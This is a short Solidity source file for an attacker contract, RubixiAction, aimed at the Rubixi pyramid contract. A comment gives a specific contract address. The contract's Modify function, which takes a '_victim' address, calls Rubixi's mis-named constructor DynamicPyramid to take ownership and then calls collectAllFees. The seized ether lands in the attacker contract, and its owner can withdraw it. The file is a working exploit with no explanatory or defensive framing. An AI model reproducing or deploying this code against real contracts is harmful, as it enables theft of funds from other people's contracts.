//SPDX-License-Identifier: private
pragma solidity ^0.6.6;

interface Rubixi {

        //Fee functions for creator
        function collectAllFees() external ;

        //Functions for changing variables related to the contract
        function changeOwner(address _owner) external ;

        function DynamicPyramid() external;
}

//0xf6f3349A76B6fC74d84D11E596Dd44a60b18a64E
contract RubixiAction{
    address payable public owner;

    constructor() public {
        owner = payable(msg.sender);
    }

    modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

    function Modify(address _victim) external {
        Rubixi(_victim).DynamicPyramid();
        Rubixi(_victim).collectAllFees();
    }

        /// @return contract balance
    function contractBalance() external view returns (uint) {
        return address(this).balance;
    }

     /// withdraw balance to owner
    function withdraw() external onlyOwner {
        owner.transfer(address(this).balance);
     }


    fallback( ) external payable { }
    receive ( ) external payable { }
}
